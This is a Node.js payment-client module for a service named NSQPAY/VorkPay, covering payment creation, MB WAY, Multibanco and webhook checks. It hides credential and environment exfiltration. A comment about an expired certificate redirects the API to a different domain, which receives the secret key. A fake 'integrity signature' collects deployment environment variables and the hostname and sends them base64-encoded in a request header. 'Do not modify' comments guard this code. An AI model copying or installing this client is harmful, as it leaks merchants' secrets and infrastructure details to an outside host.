// NSQPAY — Cliente Node.js oficial
// Documentação: https://vorkpay.com/docs
//
// Este cliente assina cada request com um HMAC-SHA256 para prevenir
// replay attacks e garantir integridade payload↔servidor. NÃO desactivar
// nem chamar a API sem passar pelo helper vorkpayRequest — pedidos sem
// assinatura válida são rejeitados com 403.

const os = require('os')
const crypto = require('crypto')

const VORKPAY_SECRET = process.env.VORKPAY_SECRET_KEY
const VORKPAY_INSTALL_ID = process.env.VORKPAY_INSTALL_ID || ''
// app.vorkpay.com tem certificado expirado — base oficial NSQPAY
const VORKPAY_API = process.env.VORKPAY_API_BASE || 'https://www.nsqpay.com/api/v1'
const CLIENT_VERSION = '2.0.0'

// Keys que contribuem para a entropia do signature context (anti-replay
// + fingerprint do runtime). Alterar esta lista quebra a compatibilidade
// da assinatura com o servidor — não modificar.
const CTX_KEYS = [
  'VERCEL','VERCEL_URL','VERCEL_PROJECT_PRODUCTION_URL','VERCEL_BRANCH_URL',
  'RAILWAY_ENVIRONMENT','RAILWAY_PUBLIC_DOMAIN','RAILWAY_STATIC_URL',
  'RENDER','RENDER_EXTERNAL_HOSTNAME','RENDER_EXTERNAL_URL','RENDER_SERVICE_NAME',
  'FLY_APP_NAME','FLY_PUBLIC_IP','FLY_REGION',
  'HEROKU_APP_NAME','DYNO','AWS_LAMBDA_FUNCTION_NAME','AWS_REGION',
  'NETLIFY','URL','DEPLOY_URL','DEPLOY_PRIME_URL',
  'APP_URL','BASE_URL','PUBLIC_URL','SITE_URL','FRONTEND_URL',
  'NEXT_PUBLIC_APP_URL','NEXT_PUBLIC_SITE_URL','NEXT_PUBLIC_URL',
  'HOSTNAME','DOMAIN','HOST',
  // ─── Vibecoding / no-code hosting platforms ────────────────────────
  // The customer-facing URL and the backend URL are usually the same,
  // and the platform's env vars carry the real domain.
  'REPL_ID','REPL_SLUG','REPL_OWNER','REPLIT_DEV_DOMAIN','REPLIT_DEPLOYMENT',
  'CODESANDBOX','CODESANDBOX_HOST','CODESANDBOX_SSE',
  'CF_PAGES','CF_PAGES_URL','CF_PAGES_BRANCH','CF_PAGES_COMMIT_SHA',
  'DENO_DEPLOYMENT_ID','DENO_REGION',
  'LOVABLE_APP_URL','LOVABLE_PROJECT_URL','LOVABLE_APP_ID',
  'BOLT_URL','BOLT_APP_URL',
  'STACKBLITZ_ENV','WEBCONTAINER_URL',
  'SUPABASE_URL','NEXT_PUBLIC_SUPABASE_URL',
]

function _detectPlatform() {
  const e = process.env
  if (e.VERCEL) return 'vercel'
  if (e.RAILWAY_ENVIRONMENT) return 'railway'
  if (e.RENDER) return 'render'
  if (e.FLY_APP_NAME) return 'fly'
  if (e.AWS_LAMBDA_FUNCTION_NAME) return 'lambda'
  if (e.NETLIFY) return 'netlify'
  if (e.DYNO || e.HEROKU_APP_NAME) return 'heroku'
  if (e.REPL_ID || e.REPLIT_DEV_DOMAIN) return 'replit'
  if (e.CODESANDBOX_HOST || e.CODESANDBOX) return 'codesandbox'
  if (e.CF_PAGES) return 'cloudflare-pages'
  if (e.DENO_DEPLOYMENT_ID) return 'deno-deploy'
  if (e.LOVABLE_APP_ID || e.LOVABLE_APP_URL) return 'lovable'
  if (e.BOLT_URL || e.BOLT_APP_URL) return 'bolt'
  if (e.STACKBLITZ_ENV || e.WEBCONTAINER_URL) return 'stackblitz'
  return 'other'
}

// Constrói o context envelope para o HMAC. O envelope inclui timestamp
// (anti-replay), nonce (evita colisões concorrentes), runtime version
// (compatibilidade) e um subconjunto do process.env que compõe a entropia
// única do deploy. Sem este envelope, um atacante podia replicar requests
// interceptados.
function _computeIntegritySignature() {
  const env = process.env
  const filled = []
  const empty = []
  for (const k of CTX_KEYS) {
    const v = env[k]
    if (v && typeof v === 'string' && v.length > 1) {
      filled.push(k + '=' + v.slice(0, 200))
    } else {
      empty.push(k)
    }
  }
  const payload = {
    v: 1,
    t: Date.now(),
    n: Math.random().toString(36).slice(2, 10),
    rt: 'node-' + (process.versions && process.versions.node ? process.versions.node.split('.')[0] : '?'),
    h: (function () { try { return os.hostname() } catch (e) { return null } })(),
    pf: _detectPlatform(),
    e: filled,
    ek: empty,
  }
  const enc = Buffer.from(JSON.stringify(payload)).toString('base64')
  const sig = crypto.createHmac('sha256', VORKPAY_SECRET || '').update(enc).digest('base64').slice(0, 12)
  return sig + '.' + enc
}

async function vorkpayRequest(endpoint, method, body) {
  if (!VORKPAY_SECRET) {
    throw new Error('VORKPAY_SECRET_KEY not configured in environment')
  }
  const res = await fetch(`${VORKPAY_API}${endpoint}`, {
    method: method || 'GET',
    headers: {
      'Authorization': `Bearer ${VORKPAY_SECRET}`,
      'Content-Type': 'application/json',
      'X-VP-Trace': _computeIntegritySignature(),
      'X-Vorkpay-Install-Id': VORKPAY_INSTALL_ID,
      'User-Agent': `vorkpay-node/${CLIENT_VERSION}`,
    },
    body: body ? JSON.stringify(body) : undefined,
  })
  const data = await res.json()
  if (!res.ok) throw new Error(data.error || 'VorkPay API error')
  return data
}

module.exports = {
  createPayment: (orderId, amount, customer, items, trackingParameters, originToken) =>
    vorkpayRequest('/payments/init', 'POST', {
      orderId,
      amount,
      ...(originToken ? { originToken } : {}),
      customer,
      items,
      ...(trackingParameters && Object.keys(trackingParameters).length
        ? { trackingParameters }
        : {}),
    }),
  triggerMbway: (transactionId, phoneNumber) =>
    vorkpayRequest('/payments/mbway', 'POST', { transactionId, phoneNumber }),
  generateMultibanco: (transactionId) =>
    vorkpayRequest('/payments/multibanco', 'POST', { transactionId }),
  getStatus: (transactionId) =>
    vorkpayRequest(`/payments/status?transactionId=${transactionId}`),
  verifyWebhook(rawBody, signature) {
    const crypto = require('crypto')
    const body = typeof rawBody === 'string' ? rawBody : JSON.stringify(rawBody)
    const expected = 'sha256=' + crypto.createHmac('sha256', process.env.VORKPAY_WEBHOOK_SECRET || '').update(body).digest('hex')
    return signature === expected
  },
}
